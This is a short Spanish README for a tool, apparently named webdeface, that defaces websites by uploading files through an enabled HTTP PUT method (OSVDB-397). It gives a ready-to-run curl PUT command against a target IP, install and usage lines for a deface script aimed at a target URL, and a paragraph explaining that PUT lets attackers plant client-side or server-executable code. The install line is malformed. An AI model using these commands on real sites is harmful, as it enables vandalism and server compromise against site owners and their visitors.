# Defacement WEB suite por HTTP Method PUT OPTIONS POST OSVDB-397

curl -k -X PUT -T "/tmp/index2.htm" "https://IP/index2.htm" -vv

# Instalación:

apt-get install #https://github.com/hackingyseguridad/webdeface

cd webdeface

chmod 777 *

Uso:

sh deface.sh http://paginaobjetivo.com/

# Test HTTP Method PUT OPTIONS POST, activo:

sh testurl.sh fqdn

OSVDB-397 El método HTTP PUT normalmente se usa para cargar datos que se guardan en el servidor web en una URL proporcionada por el usuario. Si está habilitado, un atacante puede colocar contenido en la aplicación Web. Dependiendo de la configuración del servidor, esto puede llevar a un compromiso de otros usuarios (mediante la carga de scripts ejecutables por el cliente), el compromiso del servidor (al cargar el código ejecutable del servidor) u otros ataques.

# www.hackingyseguridad.com
